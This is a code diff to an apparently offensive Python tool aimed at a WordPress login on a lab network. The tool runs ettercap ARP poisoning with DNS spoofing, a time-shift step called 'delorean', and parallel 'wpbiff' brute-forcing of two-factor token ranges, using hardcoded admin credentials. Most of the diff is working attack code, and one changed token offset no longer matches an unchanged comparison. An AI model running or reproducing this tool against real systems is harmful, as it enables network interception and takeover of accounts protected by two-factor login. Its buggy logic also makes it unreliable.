@@ -9,8 +9,7 @@ import pexpect
 from datetime import datetime
 from termcolor import colored
 from pyfiglet import Figlet
-
-from dependencies import checkDependencies
+from dependencies import checkErrors
 
 console = Console()
 app = typer.Typer()
@@ -32,25 +31,24 @@ def get_timestamp():
     if int(minute) < 40:
         hour = str((data.hour + 1) % 24)
     timestamp = data.strftime('%Y-%m-%d ' + str(hour) + ':' + str(minute))
-    print(timestamp)
     return timestamp
 
 
 def ettercap(timestamp, server, username, password):
     ip = input("Enter the IP address of the vulnerable server: ")
-    ip = "192.168.43.167"
+    ip = "192.168.43.131"
     cmd = "sudo ettercap -T -M arp /" + ip + "// -P dns_spoof"
     print("Ettercap Starting...")
     p = pexpect.spawn(cmd, timeout=None)
 
     if not p.eof():
         console.print("Ettercap Started!", style="bold green")
-        print("DNS Spoofing starting...")
+        print("DNS Spoofing Starting...")
 
     while not p.eof():
         str_line = str(p.readline())
         if "UDP  " + ip + ":" in str_line:
-            console.print("DNS Spoofing activated!", style="bold green")
+            console.print("DNS Spoofing Started!", style="bold green")
             delorean(timestamp, server, username, password)
             break
 
@@ -80,9 +78,8 @@ def delorean(timestamp, server, username, password):
 
 def wpbiff(timestamp, server, username, password):
     print("WP-biff Starting...")
-    print(timestamp)
-    command_wp_biff1 = "sudo wpbiff -t 055500 -m 554300 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
-    command_wp_biff2 = "sudo wpbiff -t 554301 -m 666666 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
+    command_wp_biff1 = "sudo wpbiff -t 000000 -m 333333 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
+    command_wp_biff2 = "sudo wpbiff -t 333333 -m 666666 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
     command_wp_biff3 = "sudo wpbiff -t 666667 -m 999999 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
 
     p1 = subprocess.Popen(shlex.split(command_wp_biff1), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -101,7 +98,7 @@ def wpbiff(timestamp, server, username, password):
             if "Token: " in output1 and int(output1.split(" ")[1]) > 0 and int(output2.split(" ")[1]) > 554300 and int(
                     output3.split(" ")[1]) > 666666:
                 cont1 = int(output1.split(" ")[1])
-                cont2 = int(output2.split(" ")[1]) - 554300
+                cont2 = int(output2.split(" ")[1]) - 333333
                 cont3 = int(output3.split(" ")[1]) - 666666
 
                 current_advance = cont1 + cont2 + cont3 - total_cont
@@ -160,10 +157,10 @@ def main(
             help=f"DNS spoofing attack"
         )):
     banner()
-    if checkDependencies():
-        server = "http://192.168.43.167/wordpress/wp-login.php"
-        username = "admin"
-        password = "ubuntu"
+    if checkErrors(server):
+        #server = "http://192.168.43.131/wordpress/wp-login.php"
+        #username = "admin"
+        #password = "ubuntu"
         with console.status("Getting timestamp to use for the Attack"):
             timestamp = get_timestamp()
             console.print("The timestamp chosen for the attack is: " + timestamp,
@@ -172,7 +169,6 @@ def main(
             ettercap(timestamp, server, username, password)
         else:
             delorean(timestamp, server, username, password)
-            # wpbiff(timestamp, server, username, password)
 
 
 def run():
